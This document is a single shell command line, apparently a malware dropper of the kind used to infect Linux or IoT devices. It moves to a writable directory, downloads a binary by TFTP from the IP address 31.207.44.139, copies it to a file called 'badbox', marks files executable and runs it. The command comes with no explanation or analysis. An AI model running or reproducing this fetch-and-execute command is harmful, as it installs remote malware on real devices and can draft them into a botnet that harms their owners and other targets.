cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 31.207.44.139 -c get wget;cat wget >badbox;chmod +x *;./badbox
